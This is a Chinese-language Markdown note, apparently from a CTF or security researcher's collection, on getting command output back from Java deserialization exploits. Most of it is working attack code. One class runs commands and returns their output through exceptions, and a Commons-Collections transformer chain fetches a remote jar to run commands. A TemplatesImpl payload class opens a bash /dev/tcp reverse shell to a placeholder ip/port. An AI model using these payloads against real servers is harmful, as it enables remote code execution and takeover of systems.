# java回显

>一般web服务是想办法获得response对象，可以参考[2021RCTF ezshell](https://github.com/Firebasky/ctf-Challenge/tree/main/RCTF-2021-EZshell)


### URLClassLoader抛出异常

```java
package exploit.firebasky;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class ErrorBaseExec
{
    public ErrorBaseExec(String cmd) throws Exception{
        do_exec(cmd);
    }

    public static byte[] readBytes(InputStream in)
            throws IOException
    {
        BufferedInputStream bufin = new BufferedInputStream(in);
        int buffSize = 1024;
        ByteArrayOutputStream out = new ByteArrayOutputStream(buffSize);
        byte[] temp = new byte[buffSize];
        int size = 0;
        while ((size = bufin.read(temp)) != -1) {
            out.write(temp, 0, size);
        }
        bufin.close();

        byte[] content = out.toByteArray();

        return content;
    }

    public static void do_exec(String cmd)
            throws Exception
    {
        Process p = Runtime.getRuntime().exec(cmd);
        byte[] stderr = readBytes(p.getErrorStream());
        byte[] stdout = readBytes(p.getInputStream());
        int exitValue = p.waitFor();
        if (exitValue == 0) {
            throw new Exception("-----------------\r\n" + new String(stdout) + "-----------------\r\n");
        }
        throw new Exception("-----------------\r\n" + new String(stderr) + "-----------------\r\n");
    }

    public static void main(String[] args)
            throws Exception
    {
        do_exec(args[0]);
    }
}
```
编译成jar之后可以封装到cc利用链组件中
```java
public static Transformer[] EchoCC() throws Exception  {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(URLClassLoader.class),
            new InvokerTransformer("getConstructor",
                new Class[]{Class[].class},
                new Object[]{new Class[]{URL[].class}}),
            new InvokerTransformer("newInstance",
                new Class[]{Object[].class},
                new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1:8099/ErrorBaseExec.jar")}}}),
            new InvokerTransformer("loadClass",
                new Class[]{String.class},
                new Object[]{"exploit.firebasky.ErrorBaseExec"}),
            new InvokerTransformer("getConstructor",
                new Class[]{Class[].class},
                new Object[]{new Class[]{String.class}}),
            new InvokerTransformer("newInstance",
                new Class[]{Object[].class},
                new Object[]{new String[]{"ipconfig"}})
        };
        return transformers;
    }
```
### defineClass
其实就是通过ClassLoader去执行(反射)我们自定义类的字节码。

```java
public static String FiletoBytes(String filename) throws Exception{
        String buf = null;
        File file = new File(filename);
        FileInputStream fis = null;
        try {
            fis = new FileInputStream(file);
            int size = fis.available();
            byte[] bytes = new byte[size];
            fis.read(bytes);
            buf = Arrays.toString(bytes);
            fis.close();
            return buf;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return buf;
    }
    
@Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        if (name == myClassName) {
            System.out.println("加载" + name + "类");
            return defineClass(myClassName, bs, 0, bs.length);
        }
        return super.findClass(name);
    }    
```

### 中间件回显
由于没有是研究tomcat等容器的回显。能力有限。


>中间件而言多数重写了thread类，在thread中保存了req和resp，可以通过获取当前线程，在resp中写入回显结果



参考：https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/

直接用项目的代码。

在利用tempimpl创建类的时候可以使用如下代码
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class evilclass extends AbstractTranslet  {
    static {
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        }catch (IOException e){
            try{
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
            }catch (IOException ee){
            }
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```


>参考：
>[Java 反序列化回显的多种姿势](https://www.joyk.com/dig/detail/1624894461629758)
>
>[Java Web代码执行漏洞回显总结](https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/)
>[通杀漏洞利用回显方法-linux平台](https://www.00theway.org/2020/01/17/java-god-s-eye/)


